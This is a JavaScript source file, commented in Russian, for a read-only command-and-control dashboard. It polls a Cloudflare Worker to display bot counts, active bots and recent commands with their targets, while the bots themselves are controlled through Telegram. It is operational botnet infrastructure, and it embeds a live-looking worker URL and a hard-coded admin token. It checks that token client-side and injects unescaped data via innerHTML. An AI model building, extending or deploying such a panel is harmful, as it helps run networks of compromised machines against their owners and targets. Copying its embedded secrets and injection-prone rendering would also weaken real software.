/**
 * Zero-Hosting C2 Dashboard — только мониторинг (read-only)
 * Версия: 2.0
 * 
 * Получает данные с Cloudflare Worker и отображает статистику.
 * Управление только через Telegram.
 */

// ==================== КОНФИГУРАЦИЯ ====================
const WORKER_URL = 'https://long-hammer.user111leo21.workers.dev';
const ADMIN_TOKEN = 'admin-token-6277175158';  // тот же, что в боте
const REFRESH_INTERVAL = 30000;  // 30 секунд

// Состояние приложения
const state = {
    authenticated: false,
    stats: {
        totalBots: 0,
        activeBots: 0,
        totalCommands: 0,
        uptime: 0,
        version: 'unknown'
    },
    commands: []
};

// ==================== АВТОРИЗАЦИЯ ====================
function login() {
    const key = document.getElementById('auth-key').value;
    
    // Простая проверка (можно убрать, если дашборд публичный)
    if (key === ADMIN_TOKEN) {
        state.authenticated = true;
        
        document.getElementById('auth-page').classList.add('hidden');
        document.getElementById('dashboard').classList.remove('hidden');
        
        startStatsUpdate();
    } else {
        alert('⛔ Неверный ключ доступа');
    }
}

// ==================== ЗАГРУЗКА ДАННЫХ ====================
async function fetchStats() {
    if (!state.authenticated) return null;
    
    try {
        const response = await fetch(`${WORKER_URL}/api/status`, {
            headers: {
                'Authorization': `Bearer ${ADMIN_TOKEN}`
            }
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        
        return await response.json();
    } catch (error) {
        console.error('Ошибка загрузки статистики:', error);
        updateConnectionStatus(false);
        return null;
    }
}

async function fetchCommands() {
    if (!state.authenticated) return [];
    
    try {
        const response = await fetch(`${WORKER_URL}/api/bots/stats`, {
            headers: {
                'Authorization': `Bearer ${ADMIN_TOKEN}`
            }
        });
        
        if (!response.ok) {
            throw new Error(`HTTP ${response.status}`);
        }
        
        const data = await response.json();
        // Возвращаем последние 10 команд (если есть)
        return data.commands?.slice(-10) || [];
    } catch (error) {
        console.error('Ошибка загрузки команд:', error);
        return [];
    }
}

// ==================== ОБНОВЛЕНИЕ ИНТЕРФЕЙСА ====================
function updateUI(stats, commands) {
    if (!stats) return;
    
    // Статус соединения
    updateConnectionStatus(true);
    
    // Основные счётчики
    document.getElementById('total-bots').textContent = stats.totalBots || 0;
    document.getElementById('active-bots').textContent = stats.activeBots || 0;
    document.getElementById('total-commands').textContent = stats.totalCommands || 0;
    
    // Дополнительная информация
    document.getElementById('worker-version').textContent = stats.version || 'unknown';
    document.getElementById('worker-uptime').textContent = formatUptime(stats.uptime || 0);
    
    // Список команд
    updateCommandsList(commands);
}

function updateCommandsList(commands) {
    const logElement = document.getElementById('command-log');
    if (!logElement) return;
    
    if (!commands || commands.length === 0) {
        logElement.innerHTML = '<div class="log-entry">📭 Нет команд</div>';
        return;
    }
    
    logElement.innerHTML = commands.map(cmd => {
        const time = new Date(cmd.timestamp).toLocaleTimeString();
        const action = cmd.action || 'unknown';
        const target = cmd.target ? ` → ${cmd.target}` : '';
        return `<div class="log-entry"><span class="timestamp">${time}</span> [${action}]${target}</div>`;
    }).join('');
}

function updateConnectionStatus(isOnline) {
    const statusEl = document.getElementById('connection-status');
    if (!statusEl) return;
    
    if (isOnline) {
        statusEl.textContent = 'Online';
        statusEl.style.color = '#00ff88';
    } else {
        statusEl.textContent = 'Offline';
        statusEl.style.color = '#ff4444';
    }
}

function formatUptime(seconds) {
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = Math.floor(seconds % 60);
    return `${hours}ч ${minutes}м ${secs}с`;
}

// ==================== ЦИКЛ ОБНОВЛЕНИЯ ====================
async function refreshData() {
    if (!state.authenticated) return;
    
    const [stats, commands] = await Promise.all([
        fetchStats(),
        fetchCommands()
    ]);
    
    updateUI(stats, commands);
}

function startStatsUpdate() {
    refreshData();
    setInterval(refreshData, REFRESH_INTERVAL);
}

// ==================== ОБРАБОТЧИКИ ====================
document.addEventListener('keypress', function(e) {
    if (e.key === 'Enter' && !state.authenticated) {
        login();
    }
});

// Выход (если нужно)
function logout() {
    state.authenticated = false;
    document.getElementById('dashboard').classList.add('hidden');
    document.getElementById('auth-page').classList.remove('hidden');
    document.getElementById('auth-key').value = '';
}